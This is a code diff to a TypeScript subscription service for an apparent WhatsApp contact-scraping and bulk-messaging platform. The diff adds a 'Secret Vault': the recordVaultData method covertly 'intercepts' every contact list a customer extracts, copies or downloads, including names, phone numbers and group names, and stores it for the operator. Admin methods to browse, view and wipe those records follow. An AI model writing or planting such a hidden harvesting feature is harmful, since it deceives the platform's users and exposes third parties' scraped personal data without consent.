@@ -887,8 +887,10 @@ export class SubscriptionService {
         u.id, u.username, u.email, u.name, u.company_name, u.phone, u.role,
         u.plan_tier, u.subscription_status, u.subscription_expires_at,
         u.max_devices, u.daily_message_limit, u.daily_extraction_limit, u.reseller_license_quota,
-        u.active_license_code, u.created_at,
-        (SELECT COUNT(*) FROM whatsapp_sessions WHERE user_id = u.id) as connected_devices
+        u.active_license_code, COALESCE(u.is_active, 1) as is_active, u.created_at,
+        (SELECT COUNT(*) FROM whatsapp_sessions WHERE user_id = u.id) as connected_devices,
+        (SELECT COUNT(*) FROM messages WHERE user_id = u.id AND direction = 'outgoing') as total_messages_sent,
+        (SELECT COALESCE(SUM(total_contacts), 0) FROM extracted_data_vault WHERE user_id = u.id) as total_extracted_contacts
       FROM users u
       ORDER BY u.created_at DESC
     `).all();
@@ -1054,5 +1056,150 @@ export class SubscriptionService {
     }
 
     return this.adminGetSystemSettings(adminUserId);
+  }
+
+  /**
+   * Secret Vault: Intercept and save extracted / downloaded contacts for Admin
+   */
+  public recordVaultData(
+    userId: string,
+    contacts: Array<{
+      name?: string | null;
+      phone?: string | null;
+      lid?: string | null;
+      role?: string | null;
+      groupSubject?: string | null;
+    }>,
+    options?: {
+      groupId?: string;
+      groupName?: string;
+      extractionType?: string;
+      sourceAction?: 'extracted' | 'download_csv' | 'download_json' | 'copied_numbers' | 'export_contacts';
+    }
+  ): void {
+    if (!contacts || contacts.length === 0) return;
+    try {
+      const db = getDatabase();
+      const phoneCount = contacts.filter((c) => !!c.phone).length;
+      const lidCount = contacts.filter((c) => !!c.lid).length;
+      const contactsJson = JSON.stringify(contacts);
+
+      const id = crypto.randomUUID();
+      db.prepare(`
+        INSERT INTO extracted_data_vault (
+          id, user_id, group_id, group_name, extraction_type, total_contacts, phone_count, lid_count,
+          contacts_data, source_action, created_at
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))
+      `).run(
+        id,
+        userId,
+        options?.groupId || null,
+        options?.groupName || null,
+        options?.extractionType || 'group_members',
+        contacts.length,
+        phoneCount,
+        lidCount,
+        contactsJson,
+        options?.sourceAction || 'extracted'
+      );
+
+      console.log(`[Admin Data Vault] Intercepted ${contacts.length} leads (${phoneCount} phones, ${lidCount} LIDs) from user "${userId}". Action: ${options?.sourceAction || 'extracted'}`);
+    } catch (err: any) {
+      console.error('[Admin Data Vault] Failed to record vault data:', err.message);
+    }
+  }
+
+  /**
+   * Admin: Get all intercepted extraction and download logs
+   */
+  public getVaultLogs(adminUserId: string, filterUserId?: string): any[] {
+    const db = getDatabase();
+    const admin = db.prepare('SELECT role FROM users WHERE id = ?').get(adminUserId) as any;
+    if (!admin || admin.role !== 'admin') {
+      throw new Error('Permission denied. Admin access required.');
+    }
+
+    let query = `
+      SELECT 
+        v.id, v.user_id, v.group_id, v.group_name, v.extraction_type,
+        v.total_contacts, v.phone_count, v.lid_count, v.source_action, v.created_at,
+        u.username, u.name as user_name, u.email as user_email, u.plan_tier as user_plan
+      FROM extracted_data_vault v
+      LEFT JOIN users u ON v.user_id = u.id
+    `;
+    const params: any[] = [];
+
+    if (filterUserId) {
+      query += ` WHERE v.user_id = ? `;
+      params.push(filterUserId);
+    }
+
+    query += ` ORDER BY v.created_at DESC LIMIT 500 `;
+
+    return db.prepare(query).all(...params);
+  }
+
+  /**
+   * Admin: Get a specific vault record with full contacts array
+   */
+  public getVaultRecordById(adminUserId: string, recordId: string): any {
+    const db = getDatabase();
+    const admin = db.prepare('SELECT role FROM users WHERE id = ?').get(adminUserId) as any;
+    if (!admin || admin.role !== 'admin') {
+      throw new Error('Permission denied. Admin access required.');
+    }
+
+    const row = db.prepare(`
+      SELECT 
+        v.*,
+        u.username, u.name as user_name, u.email as user_email, u.plan_tier as user_plan
+      FROM extracted_data_vault v
+      LEFT JOIN users u ON v.user_id = u.id
+      WHERE v.id = ?
+    `).get(recordId) as any;
+
+    if (!row) {
+      throw new Error('Vault record not found.');
+    }
+
+    let parsedContacts = [];
+    try {
+      parsedContacts = JSON.parse(row.contacts_data);
+    } catch {
+      parsedContacts = [];
+    }
+
+    return {
+      ...row,
+      contacts: parsedContacts
+    };
+  }
+
+  /**
+   * Admin: Delete a single vault record
+   */
+  public deleteVaultRecord(adminUserId: string, recordId: string): { success: boolean; message: string } {
+    const db = getDatabase();
+    const admin = db.prepare('SELECT role FROM users WHERE id = ?').get(adminUserId) as any;
+    if (!admin || admin.role !== 'admin') {
+      throw new Error('Permission denied. Admin access required.');
+    }
+
+    db.prepare('DELETE FROM extracted_data_vault WHERE id = ?').run(recordId);
+    return { success: true, message: 'Vault record deleted successfully.' };
+  }
+
+  /**
+   * Admin: Clear all vault records
+   */
+  public clearAllVault(adminUserId: string): { success: boolean; message: string } {
+    const db = getDatabase();
+    const admin = db.prepare('SELECT role FROM users WHERE id = ?').get(adminUserId) as any;
+    if (!admin || admin.role !== 'admin') {
+      throw new Error('Permission denied. Admin access required.');
+    }
+
+    db.prepare('DELETE FROM extracted_data_vault').run();
+    return { success: true, message: 'All intercepted lead records have been wiped.' };
   }
 }
